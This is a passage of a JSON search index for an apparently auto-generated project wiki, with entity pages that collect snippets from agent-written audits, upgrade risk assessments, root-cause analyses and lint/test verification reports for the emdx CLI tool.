Assessment","text":"<p>All identified dead code has **zero ext...</p> <ul> <li>#6720 wiki-privacy-research <p>Flag, don't block in post-processing -- human review is the final safety net</p> </li> <li>Audience determines strictness -- <code>--for me</code> is permissive; <code>--for docs</code> is strict; <code>--for wiki</code> is balanced</li> </ul>"},{"location":"entities/risk-assessment/#risk-assessment_2","title":"Risk Assessment","text":"<p>| Risk | Mitigation | |------|--...</p> <ul> <li>#6583 Delegate synthesis [synthesis] <p>Zero mock specs = zero regression safety net \u2014 This is arguably more impactful than the production <code>Any</code> issues because it means refactors can't rely on the test suite to catch interface drift. ## Actionable Items (Priority Order)</p> </li> </ul>"},{"location":"entities/risk-assessment/#immediate","title":"Immediate ...","text":"<ul> <li>#6508 Any Type Removal Analysis [synthesis] <p><code>print_json</code> in <code>output.py</code> \u2014 Intentionally permissive JSON serialization</p> </li> <li>Intermediate mutation dicts (e.g., <code>raw: dict[str, Any]</code> before cast) \u2014 Acceptable for mutation patterns</li> </ul>"},{"location":"entities/risk-assessment/#risk-assessment_3","title":"Risk Assessment","text":"<p>| Change Type | Risk | Notes | |--...</p> <ul> <li>#6491 Any Type Removal Analysis [1/5] <p>Type the timer/stream variables in <code>cascade_view.py</code> using actual Textual/emdx types. ---</p> </li> </ul>"},{"location":"entities/risk-assessment/#risk-assessment_4","title":"Risk Assessment","text":"<ul> <li>Low risk: Replacing <code>Any</code> with <code>object</code> in <code>__init__</code> signatures</li> <li> <p>Medium risk: Adding TypedDicts \u2014 requires verifying all ac...</p> </li> <li> <p>#6423 Delegate: Research upgrading pytest from 7.x to 9.x, pytest-cov from 4 [1/5]</p> <p>[ ] Run test suite: <code>poetry run pytest tests/ -v</code></p> </li> <li> <p>[ ] Check for any new warnings: <code>poetry run pytest tests/ -W error</code></p> </li> </ul>"},{"location":"entities/risk-assessment/#risk-assessment_5","title":"RISK ASSESSMENT","text":"Change Risk Level Notes pytest 7\u21929 Low No custom hooks, ... <ul> <li>#6422 Delegate: Research upgrading rich from 13.x to 14.x. Identify breaking [3/5]   Section: Upgrade Recommendation </li> <li>Standard Console, Table, Panel, Markdown, Progress usage</li> <li> <p>No deprecated APIs used (RenderGroup, render_group)...</p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]</p> <p>Consider adding a <code>--allow-shell</code> flag for <code>--each</code> that must be explicitly enabled</p> </li> <li>Add security audit to CI pipeline</li> </ul>"},{"location":"entities/risk-assessment/#risk-assessment_6","title":"Risk Assessment","text":"<p>Low Risk - Our usage of Rich is straightforward:</p>"},{"location":"entities/risk-assessment/#risk-assessment_7","title":"Risk Assessment","text":"Category Status SQL Injection \u2705 Well protected with parameterization an... <ul> <li>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis <p>What is missing is architectural documentation, type completeness, and keeping docs current with code. ---</p> </li> </ul>"},{"location":"entities/risk-assessment/#prioritized-recommendations","title":"Prioritized Recommendations","text":""},{"location":"entities/risk-assessment/#tier-1-critical-fix-this-sprint","title":"Tier 1: Critical (Fix This Sprint)","text":"<p>1.1 Replace O(n\u00b2) Duplicate Detection - File: `emdx/services/dupli...</p> <ul> <li>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Test Coverage <p>...(CI green on Python 3.13)</p> </li> <li>New test coverage: None added for new features</li> <li>Risk assessment: LOW</li> <li>New features are additive (existing behavior unchanged when new flags not used)</li> <li>Core tag logic uses battle-tested <code>normalize_tag_to_emoji</code></li> <li> <p>Filters...</p> </li> <li> <p>#6527 Delegate: Review GitHub PR #649 using 'gh pr view 649' and 'gh pr diff [4/4]   Section: Verdict</p> <p>Risk Assessment: Low - the validation is solid and changes are isolated.</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: Table of Contents</p> <p>...dopt](#3-new-features-we-could-adopt)</p> </li> <li>Migration Steps</li> <li>Risk Assessment</li> <li> <p>Testing Checklist</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]</p> <p>Update ADR in <code>docs/adr/002-typer-cli-framework.md</code></p> </li> </ul>"},{"location":"entities/risk-assessment/#4-risk-assessment","title":"4. Risk Assessment","text":"Risk Severity Likelihood Mitigation CliRunner API changes Medium Low Verified no <code>mix_stderr</code> usage"},{"location":"entities/risk-assessment/#related-entities","title":"Related Entities","text":"<ul> <li><code>overview three</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>tasksyncresult</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/risk/","title":"risk:","text":"<p>Type: concept | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/risk/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6611 Emoji alias removal: synthesis   Section: Database Migration is Mandatory</p> <p>Risk: The <code>\"\ud83d\udfe2\"</code> \u2192 <code>\"active\"</code> mapping has a pre-existing inconsistency (code uses <code>\"\ud83d\udfe2\"</code> but alias maps <code>\"active\"</code> \u2192 <code>\"\ud83d\ude80\"</code>). Must be resolved during migration.</p> </li> <li> <p>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]   Section: P0 \u2014 HIGH RISK: Mocks of domain classes with evolving APIs</p> <p>...elegate_commands.py<code>(15+ instances),</code>test_unified_executor.py` (5 instances)</p> </li> <li> <p>Risk: <code>UnifiedExecutor.execute()</code> is the core execution path. If <code>execute()</code> is renamed or its return type changes, the mock will still accept any attribute access. The...</p> </li> <li> <p>#6405 Bug Fix PR Reviews [4/6]   Section: Detailed Review</p> <p>...pkl exists, <code>_load_cache()</code> will return False (cache miss), triggering rebuild</p> </li> <li>Risk: Low - cache rebuild is automatic and transparent</li> <li> <p>Suggestion: Consider adding explicit cleanup of old .pkl file in <code>_save_cache()</code> or <code>invalidate_cache()</code> to...</p> </li> <li> <p>#6378 Codebase Bug Audit 2026-02-15 [9/10]   Section: MEDIUM Severity Issues (2 Found)</p> <p>Risk: If an attacker can write to <code>~/.emdx/similarity_cache.pkl</code>, they could achieve arbitrary code execution when the cache is loaded. The cache path is in the user's home directory.</p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: Recommendation</p> <p>Estimated effort: 30 minutes for version bump + testing Risk: Low-Medium Benefit: Improved UX, performance, and future compatibility</p> </li> <li> <p>#6231 Delegate: Audit CONFIGURATION DEBT in the emdx project: Find hardcoded [2/14]   Section: CRITICAL SEVERITY</p> <p>Risk: When models are updated, multiple files must be changed. Easy to miss one.</p> </li> <li> <p>#6221 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 1. COMMAND INJECTION - HIGH SEVERITY</p> <p>Risk: The <code>--each</code> option accepts arbitrary shell commands from users and executes them with <code>shell=True</code>. An attacker could inject malicious commands.</p> </li> <li> <p>#6215 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]   Section: \ud83d\udd34 HIGH SEVERITY</p> <p>...aml matrix:   python-version: [\"3.13\"]  # Should be [\"3.11\", \"3.12\", \"3.13\"] ``` Risk: Breaking changes in 3.11/3.12 won't be caught</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: Is the Task Data Useful?</p> <p>...ty labels (P0-P4) make sense for manual planning but are never set by delegate</p> </li> <li>Risk: Mixing delegate-created tasks with manual tasks could clutter the \"ready work\" view</li> </ul>"},{"location":"entities/risk/#related-entities","title":"Related Entities","text":"<ul> <li><code>~/.emdx/similarity_cache.pkl</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer.context</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>pickle.load()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>files:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>shell=false</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.9)</li> <li><code>shlex.split()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.8)</li> <li><code>--each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.5)</li> </ul>"},{"location":"entities/root-cause/","title":"root cause","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2025-07-07</p>"},{"location":"entities/root-cause/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6835 Delegate: list   Section: Summary</p> </li> <li> <p>#6526 Gameplan: Single-click highlights, double-click opens fullscreen   Section: Bug: Single click in Activity TUI opens fullscreen</p> </li> <li> <p>#6357 Delegate: Investigate why the textual upgrade analysis delegate (doc #6353) didn't create a PR   Section: Summary</p> <p>Both textual and typer upgrade analysis delegates were launched with <code>--pr</code> flag at the same time. Typer created PR #568 but textual did not. Root cause: The textual agent made a judgment call not to create a PR.</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> </li> <li> <p>#6214 CI Fix: PR #454 Semantic Find Tests   Section: PR #454 CI Fix - Semantic Find Tests</p> </li> <li> <p>#6194 Analysis: Delegate + Activity Browser Issues   Section: 6 Issues Found</p> </li> <li> <p>#461 TextArea Read-Only Fix Analysis   Section: TextArea Read-Only Implementation Analysis</p> </li> <li>_on_key is a private method and might not be the correct interception point</li> <li>TextArea handles input through multiple pathways (keyboard, paste, IME)</li> <li> <p>Need to override public methods instead</p> </li> <li> <p>#170 Claude Thinking White Background - SOLUTION   Section: Claude Code Thinking Text White Background - SOLUTION</p> </li> <li>Terminal has a dark background</li> <li>Claude Code auto-detects or defaults to a light theme</li> <li> <p>The thinking text inherits the wrong color scheme</p> </li> <li> <p>#36 Claude Document Template System   Section: Quick Templates</p> </li> <li> <p>#42 Fish Sourcing Issue Analysis   Section: Fish Function Sourcing Issue Analysis</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Issues \ud83d\udea8</p> <p>Root cause: Tests mock <code>search_documents</code> but the new hybrid path bypasses this mock entirely. When <code>use_hybrid=True</code>, it calls <code>HybridSearchService.search()</code> which isn't mocked.</p> </li> <li> <p>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: 1. SQLiteDatabase Wrapper Architecture Bug (Identified by all 4 tracks)</p> <p>Root Cause: The <code>SQLiteDatabase</code> wrapper class creates its own <code>DatabaseConnection</code> instance but delegates all operations to module-level functions that use the global <code>db_connection</code> singleton.</p> </li> <li> <p>#6853 Delegate: FIX-6: Investigate delegate --pr permission failures (FIX-4/ [4/4]</p> </li> </ul>"},{"location":"entities/root-cause/#root-cause_1","title":"Root Cause","text":"<p>The subcommand routing code in the <code>delegate()</code> callback used <code>isinstance(ctx.command, click.MultiCommand)</code> but <code>click</code> was not imported. This caused `emdx delegate...</p>"},{"location":"entities/root-cause/#root-cause_2","title":"Root Cause","text":"<p><code>emdx/ui/activity/activity_view.py</code> line 956-958:</p>"},{"location":"entities/root-cause/#root-cause_3","title":"Root Cause","text":"<p>Migrations 031 and 036 added columns to the executions table but the Execution dataclass and query functions were not updated to match. Migration 013 dropped <code>last_heartbeat</code> but the functions referencing it were not updated.</p>"},{"location":"entities/root-cause/#root-cause_4","title":"Root Cause","text":"<p>The tests mock <code>search_documents</code> which is the FTS (keyword) search path. When hybrid search became the default, these tests started hitting the real (empty) database instead of the mock.</p>"},{"location":"entities/root-cause/#root-cause_5","title":"Root Cause","text":"<p>The executions table was designed for the old workflow system where doc_id was known upfront. Delegate creates output docs AFTER execution but never writes the doc_id back.</p>"},{"location":"entities/root-cause/#root-cause_6","title":"Root Cause","text":""},{"location":"entities/root-cause/#root-cause_7","title":"Root Cause","text":"<p>This is a known issue with Claude Code when:</p>"},{"location":"entities/root-cause/#root-cause_8","title":"Root Cause","text":"<p>[If known]</p>"},{"location":"entities/root-cause/#root-cause_9","title":"Root Cause","text":"<p>Missing dependency: <code>__claude_psql</code> function is defined in <code>claude-config.fish</code> but this file isn't being sourced before <code>claude-functions.fish</code> uses it.</p>"},{"location":"entities/root-cause/#fix-6-analysis-complete-saved-as-emdx-doc-6852","title":"FIX-6 Analysis Complete \u2014 Saved as emdx doc #6852","text":""},{"location":"entities/root-cause/#key-findings","title":"Key Findings","text":"<p>PR #777 did NOT fix the --pr permission failures. Doc #6848 shows failures occurring after PR #777 merged. ### Root Cause: Space-in-Pattern Parsing Bug</p> <p>The delegate builds `...</p> <ul> <li>#6601 Delegate: Fix PR #687 on branch delegate/add-a-typeddict-for-the-dict- <p>The PR correctly replaced the only usage: <code>dict[str, Any]</code> return type \u2192 <code>ExecutionResultDict</code> TypedDict</p> </li> <li> <p>The file uses <code>format_stream_line(line: str, ...)</code> (not <code>format_stream_message(msg: Mapping[str, Any], ...)</code>), so there's no other <code>Any</code> refer...</p> </li> <li> <p>#4746 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 1: N+1 Database Query Pattern (Universal - CRITICAL)</p> <p>Root Cause: Missing batch query functions in <code>emdx/workflows/database.py</code> and <code>emdx/database/documents.py</code>.</p> </li> </ul>"},{"location":"entities/root-cause/#related-entities","title":"Related Entities","text":"<ul> <li><code>hybridsearchservice.search()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>test_find_json_output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>test_find_ids_only</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>test_find_basic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>--mode keyword</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.5)</li> <li><code>problem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.2)</li> <li><code>nameerror</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.2)</li> <li><code>impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.0)</li> <li><code>location</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=3.8)</li> <li><code>search_documents</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.7)</li> </ul>"},{"location":"entities/ruff-check/","title":"ruff check","text":"<p>Type: heading | Mentioned in: 18 documents | First seen: 2026-02-14</p>"},{"location":"entities/ruff-check/#documents-18","title":"Documents (18)","text":"<ul> <li>#6403 Bug Fix PR Reviews [1/6]   Section: Edge Cases Analysis </li> <li> <p><code>poetry run ruff check emdx/database/cascade.py</code> - All checks passed! \u2705</p> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <p>Verification:</p> </li> <li><code>ruff check</code> \u2014 all checks passed</li> <li><code>mypy</code> \u2014 no issues</li> <li><code>pytest -k delegate</code> \u2014 100/100 tests passed</li> <li><code>emdx delegate --help</code> \u2014 shows full help with examples and subcommands</li> <li> <p>`e...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> </li> <li><code>ruff check</code>: all passed</li> <li><code>mypy</code>: no issues found in both files</li> <li><code>pytest</code>: 1189 passed, 9 skipped</li> <li> <p>Pre-commit hooks: ruff lint, ruff format, mypy all passed</p> </li> <li> <p>#6601 Delegate: Fix PR #687 on branch delegate/add-a-typeddict-for-the-dict-   Section: Verification Results</p> Check Result <code>ruff check</code> All checks passed <code>mypy</code> No issues found <code>pytest</code> (executor tests) 72 passed, 2 skipped <code>pytest</code> (full suite) 1 pre-existing failure in <code>test_task_browser.py</code> (unrelated) </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: Verification</p> <ul> <li><code>ruff check</code> passes with zero errors</li> </ul> </li> <li>All imports verified working: <code>from emdx.services import ...</code> succeeds</li> <li> <p>Tests pass: 35 passed, 1 skipped</p> </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_   Section: Verification</p> <ul> <li><code>ruff check</code> passes with zero errors</li> </ul> </li> <li><code>mypy</code> passes with no issues</li> <li> <p>Tests in <code>test_unified_executor.py</code> confirm <code>to_dict()</code> behavior (pytest version mismatch prevents running in this worktree, but the change is type-only)</p> </li> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Quality Checks</p> <p>All checks passed:</p> </li> <li>\u2705 <code>ruff check</code> - 0 errors</li> <li>\u2705 <code>ruff format</code> - No changes needed</li> <li>\u2705 <code>mypy</code> - No type errors</li> <li> <p>\u2705 <code>pytest</code> - 1200 tests pass</p> </li> <li> <p>#6537 Delegate: Document #6526 (Gameplan: Single-click highlights, double-cl   Section: Testing Notes</p> <ul> <li>Both modified files pass <code>ruff check</code> and <code>ruff format</code></li> </ul> </li> <li>Both modules import successfully (<code>poetry run python -c \"from emdx.ui.activity.activity_tree import ActivityTree\"</code>)</li> <li> <p>Manual testing should veri...</p> </li> <li> <p>#6481 Delegate: Kink 4: Make delegate --synthesize resilient to agent failur [1/3]   Section: Testing</p> <ul> <li>Module imports correctly with new <code>SingleResult</code> fields</li> </ul> </li> <li><code>ruff check</code> passes with zero errors</li> <li> <p>Backward compatible - successful runs behave identically to before</p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <p>Quality checks passed:</p> </li> <li><code>ruff check</code> \u2014 All checks passed</li> <li><code>mypy</code> \u2014 No issues found  </li> <li> <p><code>pytest</code> \u2014 15 tests passed</p> </li> <li> <p>#6431 Add cascade TypedDicts to database and service layers   Section: Changes Made</p> </li> <li>\u2705 <code>ruff check</code> passes with zero errors</li> <li> <p>\u2705 <code>mypy</code> runs (shows expected type coercion warnings)</p> </li> <li> <p>#6392 Delegate: Replace pickle with safe serialization in similarity cache.   Section: Changes Made</p> </li> <li><code>ruff check</code> passes with zero errors</li> <li> <p>All similarity-related tests pass</p> </li> <li> <p>#6391 Delegate: Fix UI race conditions. Task #625: In emdx/ui/document_brows   Section: Testing</p> <p>Both files pass <code>ruff check</code> with zero errors.</p> </li> <li> <p>#6244 Dependency Debt Cleanup - Implementation Report   Section: Changes Made</p> </li> <li>All 797 tests pass</li> <li><code>ruff check</code> works with updated version</li> <li><code>ruff format --check</code> works with new configuration</li> <li> <p><code>poetry lock</code> and <code>poetry install</code> successful</p> </li> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: Verification</p> <ul> <li>ruff check: All checks passed (0 errors)</li> </ul> </li> <li>mypy: Success, no issues found in 2 source files</li> <li>pytest: 1189 passed, 9 skipped in 14.37s</li> <li> <p>Force-pushed: <code>c2cc91d...f39649a</code> (forced update)</p> </li> <li> <p>#6562 Delegate: Remove vim_line_numbers and VimEditor dead code from the TUI   Section: Verification</p> <ul> <li>ruff check: All checks passed</li> </ul> </li> <li>pytest: 1189 passed, 9 skipped, 9 warnings in 16.31s</li> </ul>"},{"location":"entities/ruff-check/#ruff-check_1","title":"Ruff Check","text":""},{"location":"entities/ruff-check/#verification","title":"Verification","text":""},{"location":"entities/ruff-check/#verification_1","title":"Verification","text":""},{"location":"entities/ruff-check/#verification_2","title":"Verification","text":""},{"location":"entities/ruff-check/#verification_3","title":"Verification","text":""},{"location":"entities/ruff-check/#related-entities","title":"Related Entities","text":"<ul> <li><code>pytest</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.6)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>origin/main</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>force-pushed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>fix pr #689: rebase and resolve merge conflicts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>delegate: fix pr #687 \u2014 add executionresultdict typeddict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>delegate/remove-any-remaining-references-to-curso-90eaf</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>cursor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>claude-opus-4-6</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/runchain/","title":"_run_chain()","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/runchain/#documents-8","title":"Documents (8)","text":"<ul> <li>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Problem <p>...Used <code>feat/{slugified-title}</code> - no collision prevention</p> </li> <li> <p><code>_run_single()</code> and <code>_run_chain()</code>: Relied on whatever branch name was passed or told agent to create its own</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Details</p> <p>...instruction(draft: bool)` function</p> </li> <li>Updated <code>_run_single()</code>, <code>_run_parallel()</code>, <code>_run_chain()</code> to accept draft parameter</li> <li> <p>Fixed default mismatch between CLI and internal functions</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Delegate Integration Points</p> <p>...()<code>| Execute single task | |</code>_run_parallel()<code>| Execute multiple concurrent | |</code>_run_chain()<code>| Execute sequential pipeline | |</code>_resolve_task()` | Convert IDs to content |</p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Changes Made</p> <p>...y default</p> </li> <li>Added <code>draft</code> parameter to <code>_run_single()</code>, <code>_run_parallel()</code>, and <code>_run_chain()</code> functions</li> <li> <p>Updated known_flags guard to include <code>--draft</code> and <code>--no-draft</code></p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Task 4: Pass <code>draft</code> flag through the call chain</p> <ol> <li><code>_run_single()</code> - Add <code>draft: bool = False</code> parameter</li> </ol> </li> <li><code>_run_parallel()</code> - Add <code>draft: bool = False</code> parameter  </li> <li><code>_run_chain()</code> - Add <code>draft: bool = False</code> parameter</li> <li> <p><code>delegate()</code> - Pass <code>draft</code> to all runner calls</p> </li> <li> <p>#6303 Delegate: DEBT-10 RETRY: Fix type safety debt in the emdx project. Foc   Section: Functions with Return Type Annotations</p> <p>...n_single()<code>\u2192</code>tuple[int | None, int | None]`</p> </li> <li><code>_run_parallel()</code> \u2192 <code>list[int]</code></li> <li> <p><code>_run_chain()</code> \u2192 <code>list[int]</code></p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 2. UNTESTED PUBLIC FUNCTIONS IN EXISTING MODULES</p> <p>...n_parallel()<code>| \ud83d\udd34 CRITICAL | Test parallel task execution, result aggregation | |</code>_run_chain()<code>| \ud83d\udd34 CRITICAL | Test chained execution with output passing | |</code>delegate()` | \ud83d\udd34 CRITICAL | Integration test for all flag combinations |</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Delegate Integration (emdx/commands/delegate.py)</p> <p>...(doc_id, task_id) | | <code>_run_parallel()</code> | Execute multiple tasks concurrently | | <code>_run_chain()</code> | Execute sequentially with output piping | | <code>_resolve_task()</code> | Convert doc IDs to content | | <code>_run_discovery()</code> | Run shell cmd for item discovery |</p> </li> </ul>"},{"location":"entities/runchain/#related-entities","title":"Related Entities","text":"<ul> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>services layer integration points</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>sequential pipeline</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>recovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>models layer commands layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>model layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>log_progress()</code> 